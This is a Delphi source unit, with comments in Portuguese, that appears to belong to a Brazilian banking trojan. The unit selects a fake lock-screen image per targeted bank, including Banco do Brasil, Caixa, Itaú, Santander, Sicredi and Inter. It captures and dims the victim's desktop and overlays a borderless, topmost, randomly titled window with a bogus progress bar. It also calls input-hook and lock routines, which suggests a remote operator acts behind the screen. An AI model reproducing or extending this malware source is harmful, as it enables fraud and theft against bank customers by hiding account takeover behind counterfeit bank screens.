unit usession;

interface

uses
  Windows, CommCtrl, Messages, Graphics;

var
  Msg: TMSG;
  LWndClass: TWndClass;
  Handle_Main: HWND;
  hStatic, Handle_Pic, hStatic3: HWND;
  bitground: TBitmap;
  Handle_Progress: HWND;
  pWidth, pHeight: Integer;
  r, rcDesktop: trect;
  membitmap: hbitmap;
  hBKDC, hDesktopDC, hBKDC2L: HDC;
  hBitmapBKOld: hbitmap;
  hBitmapBK2LOld: HGDIOBJ;
  bf: BLENDFUNCTION;
  flagok: Boolean;

procedure Running_Block;

procedure Running_ReleaseResources;

implementation

uses
  variaveis, principal, ut_01, ut_02, ut_03, ut_04, ut_05, ut_06, ut_07,
  ut_test, conexoes, umodulo;

function Set_Trava: string;  // CHAMANDO AS TELAS DE TRAVAR - arquivo Resource.rc
begin
  case Global.id of
    1:
      begin // bb
        result := 'L01';
      end;
    2:
      begin // desco
        result := 'L02';
      end;
    3:
      begin // cef
        result := 'L03';
      end;
    4:
      begin // ita
        result := 'L04';
      end;
    5:
      begin // santa
        result := 'L05';
      end;
    6:
      begin // sicred
        result := 'L06';
      end;
    7:
      begin // sicoob
        result := 'L07';
      end;
    8:
      begin // unicred
        result := 'L08';
      end;
    9:
      begin // inter
        result := 'L09';
      end;
    10:
      begin // nordeste
        result := 'L10';
      end;
    11:
      begin // mercan
        result := 'L11';
      end;
    12:
      begin // geral
        result := 'L12';
      end;
    13:
      begin // MP
        result := 'L13';
      end;
    14:
      begin // ML
        result := 'L14';
      end;
    15:
      begin // BS2
        result := 'L15';
      end;
    16:
      begin // Banrisul
        result := 'L16';
      end;
    17:
      begin // safra
        result := 'L17';
      end;
    18:
      begin // uniprime
        result := 'L18';
      end;
    19:
      begin // Banestes
        result := 'L19';
      end;
    20:
      begin // Banpara
        result := 'L20';
      end;
    21:
      begin // Banese
        result := 'L21';
      end;
    22:
      begin // Original
        result := 'L22';
      end;
    23:
      begin // iNTER2
        result := 'L23';
      end;

  end;

end;

procedure Running_ReleaseResources;
begin
  try
    try
      if Assigned(TNT_01) then
        TNT_01.Close;
      if Assigned(TNT_02) then
        TNT_02.Close;
      if Assigned(TNT_03) then
        TNT_03.Close;
      if Assigned(TNT_04) then
        TNT_04.Close;
      if Assigned(TNT_05) then
        TNT_05.Close;
      if Assigned(TNT_06) then
        TNT_06.Close;
      if Assigned(TNT_07) then
        TNT_07.Close;
      if Assigned(TNT_TEST) then
        TNT_TEST.Close;
      Install_Cur(false);
      UnHookIt;
      UniInstal_lock;
      DestroyWindow(Handle_Progress);
      DestroyWindow(Handle_Pic);
      DestroyWindow(Handle_Main);
      bitground.Free;
      bitground := nil;
      DeleteObject(SelectObject(hBKDC2L, hBitmapBK2LOld));
      DeleteObject(hBKDC2L);
    except
    end;
  finally
    // PostQuitMessage(0);
  end;
end;

function WindowProc(HWND, Msg: Longint; wParam: wParam; lParam: lParam)
  : Longint; stdcall;
var
  ps: PAINTSTRUCT;
  hDCx: HDC;
  // rcDesktop:tRECT;
begin
  case Msg of
    { WM_KEYUP:
      begin
      if Assigned(TNT_01) then
      begin
      bBlockMouse:=False;
      // SetWindowPos(TNT_01.handle, HWND_TOPMOST, TNT_01.Left, TNT_01.Top, TNT_01.Width, TNT_01.Height, 0);
      end
      end;
      WM_KEYDOWN:
      begin
      if Assigned(TNT_01) then
      begin
      bBlockMouse:=True;
      // SetWindowPos(TNT_01.handle, HWND_TOPMOST, TNT_01.Left, TNT_01.Top, TNT_01.Width, TNT_01.Height, 0);
      end; }
    // end;
    WM_COMMAND:
      begin

      end;
    WM_PAINT:
      begin

        hDCx := BeginPaint(HWND, ps);
        GetWindowRect(GetDesktopWindow(), rcDesktop);
        BitBlt(hDCx, 0, 0, rcDesktop.Right, rcDesktop.Bottom, hBKDC, 0,
          0, SRCCOPY);
        EndPaint(HWND, ps);
      end;
    WM_CREATE:
      begin

      end;
    WM_DESTROY:
      begin
        Running_ReleaseResources
      end;
  end;
  result := DefWindowProc(HWND, Msg, wParam, lParam);
end;

function Randomstring(strLen: Integer): string;
var
  str: string;
begin
  Randomize;

  str := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW XYZ';
  result := '';
  repeat
    result := result + str[Random(Length(str)) + 1];
  until (Length(result) = strLen) end;

  procedure print(Height, Width: Integer);
  var
    DCDesk: HDC;
  begin
    if vFlagScree = 1 then
    begin
      bitground := TBitmap.Create;
      bitground.Height := Height;
      bitground.Width := Width;
      DCDesk := GetWindowDC(GetDesktopWindow);
      BitBlt(bitground.Canvas.Handle, 0, 0, Width, Height, DCDesk, 0,
        0, SRCCOPY);
      ReleaseDC(GetDesktopWindow, DCDesk);
    end;
    if vFlagScree = 0 then
    begin
      bitground := TBitmap.Create;
      bitground.Height := Height;
      bitground.Width := Width;
      DCDesk := GetWindowDC(hWndMag);
      BitBlt(bitground.Canvas.Handle, 0, 0, Width, Height, DCDesk, 0,
        0, SRCCOPY);
      ReleaseDC(GetDesktopWindow, DCDesk);
    end;
    // bmp.Free;
  end;

  procedure SethWndTrasparent(HWND: HWND; Transparent: Boolean);
  var
    l: Longint;
    lpRect: trect;
  begin
    if Transparent then
    begin
      l := GetWindowLong(HWND, GWL_EXSTYLE);
      l := l or WS_EX_LAYERED;
      SetWindowLong(HWND, GWL_EXSTYLE, l);
      SetLayeredWindowAttributes(HWND, 0, 255, LWA_ALPHA);
    end
    else
    begin
      l := GetWindowLong(HWND, GWL_EXSTYLE);
      l := l xor WS_EX_LAYERED;
      SetWindowLong(HWND, GWL_EXSTYLE, l);
      GetWindowRect(HWND, lpRect);
      InvalidateRect(HWND, lpRect, true);
    end;
  end;

  procedure setAlphaBlend(hTransp: HWND; semitransp, cortransp: Boolean;
    niveltransp: byte; numcortransp: cardinal);
  const
    cUseAlpha: array [Boolean] of Integer = (0, LWA_ALPHA);
    cUseColorKey: array [Boolean] of Integer = (0, LWA_COLORKEY);
  var
    AStyle: Integer;
  begin
    AStyle := GetWindowLong(hTransp, GWL_EXSTYLE);
    SetWindowLong(hTransp, GWL_EXSTYLE, AStyle or WS_EX_LAYERED);
    SetLayeredWindowAttributes(hTransp, numcortransp, niveltransp,
      cUseAlpha[semitransp] or cUseColorKey[cortransp]);
  end;

  procedure Running_Block;
  var
    ColorRef: TColorRef;
  begin

    LWndClass.hInstance := 0;
    with LWndClass do
    begin
      lpszClassName := ' ';
      // Style := CS_PARENTDC or CS_BYTEALIGNCLIENT;
      // hIcon := LoadIcon(hInstance, 'MAINICON');
      lpfnWndProc := @WindowProc;
      // hbrBackground := COLOR_BTNFACE + 1;
      hCursor := LoadCursor(0, IDC_ARROW);
    end;

    // DisablePeek;
    Windows.RegisterClass(LWndClass);
    GetWindowRect(GetDesktopWindow, r);
    // bitground.LoadFromStream(testando);
    print(r.Height, r.Width);
    GetWindowRect(GetDesktopWindow, rcDesktop);

    // Handle_Main := CreateWindow(LWndClass.lpszClassName, '', WS_VISIBLE or WS_POPUP or	WS_CLIPSIBLINGS or WS_CLIPCHILDREN, r.Left, r.Top, r.Right, r.Bottom, 0, 0, 0, nil);
    // SetWindowLong(Handle_Main, GWL_STYLE, GetWindowLong(Handle_Main, GWL_STYLE) and not WS_BORDER and not WS_SIZEBOX and not WS_DLGFRAME);
    // SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main, GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);

    Handle_Main := CreateWindow(LWndClass.lpszClassName,
      PWideChar(Randomstring(10)), WS_CAPTION, r.Left, r.Top, r.Right, r.Bottom,
      HWND_DESKTOP, 0, 0, nil);
    SetWindowLong(Handle_Main, GWL_STYLE, GetWindowLong(Handle_Main, GWL_STYLE)
      and not WS_BORDER and not WS_SIZEBOX and not WS_DLGFRAME);
    SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
      GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);
    SetWindowPos(Handle_Main, HWND_TOPMOST, rcDesktop.Left, rcDesktop.Top,
      rcDesktop.Right - rcDesktop.Left, rcDesktop.Bottom - rcDesktop.Top,
      SWP_SHOWWINDOW);
    // setAlphaBlend(Handle_Main, false, false, 255, 0);
    SethWndTrasparent(Handle_Main, true);
    SetForegroundWindow(Handle_Main);
    ShowWindow(Handle_Main, SW_MAXIMIZE);
    // UpdateWindow(Handle_Main);

    GetWindowRect(GetDesktopWindow(), rcDesktop);
    hDesktopDC := GetDC(GetDesktopWindow());

    hBKDC := CreateCompatibleDC(hDesktopDC);
    hBitmapBKOld := SelectObject(hBKDC, CreateCompatibleBitmap(hDesktopDC,
      rcDesktop.Right, rcDesktop.Bottom));

    BitBlt(hBKDC, 0, 0, rcDesktop.Right, rcDesktop.Bottom,
      bitground.Canvas.Handle, 0, 0, SRCCOPY);

    hBKDC2L := CreateCompatibleDC(hDesktopDC);
    hBitmapBK2LOld := SelectObject(hBKDC2L, CreateCompatibleBitmap(hDesktopDC,
      rcDesktop.Right, rcDesktop.Bottom));
    ReleaseDC(GetDesktopWindow(), hDesktopDC);
    FillRect(hBKDC2L, rcDesktop, HBRUSH(GetStockObject(BLACK_BRUSH)));
    bf.BlendOp := AC_SRC_OVER;
    bf.BlendFlags := 0;
    bf.SourceConstantAlpha := 100;
    AlphaBlend(hBKDC, 0, 0, rcDesktop.Right, rcDesktop.Bottom, hBKDC2L, 0, 0,
      rcDesktop.Right, rcDesktop.Bottom, bf);

    pWidth := 642;
    pHeight := 484;
    membitmap := loadimage(hInstance, PWideChar(Set_Trava), IMAGE_BITMAP, 0, 0,
      LR_CREATEDIBSECTION + LR_DEFAULTSIZE);
    Handle_Pic := CreateWindow(PWideChar('Static'), '', SS_BITMAP or WS_CHILD or
      WS_VISIBLE or WS_TABSTOP, (r.Width - pWidth) div 2,
      (r.Height - pHeight) div 2, pWidth, pHeight, Handle_Main, 0, 0, nil);
    SendMessage(Handle_Pic, STM_SETIMAGE, IMAGE_BITMAP, membitmap);
    // ShowWindow(Handle_Pic, WS_VISIBLE);
    // DeleteObject(MemBitmap);

    // BARRA DE PROGRESSO DAS TRAVAS
    Handle_Progress := CreateWindowEx(0, PWideChar('msctls_progress32'), '',
      WS_CHILD or WS_VISIBLE or PBS_SMOOTH, 76, 352, 507, 16, Handle_Pic,
      0, 0, nil);
    SendMessage(Handle_Progress, PBM_SETBARCOLOR, 0, RGB(0,0,205));
    SendMessage(Handle_Progress, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    SendMessage(Handle_Progress, PBM_SETPOS, 2, 0);
    SendMessage(Handle_Progress, PBM_SETSTEP, 1, 0);
    SendMessage(Handle_Progress, PBM_SETSTEP, 1, 0);
    SendMessage(Handle_Progress, PBM_SETSTEP, 1, 0);

    ShowWindow(Handle_Main, WS_VISIBLE);
    SetWindowPos(Handle_Main, HWND_TOPMOST, 0, 0, 0, 0, Swp_NoMove or
      Swp_NoSize);
    // message loop
    // { while GetMessage(Msg, 0, 0, 0) do
    // begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
    // end;  }

  end;

end.
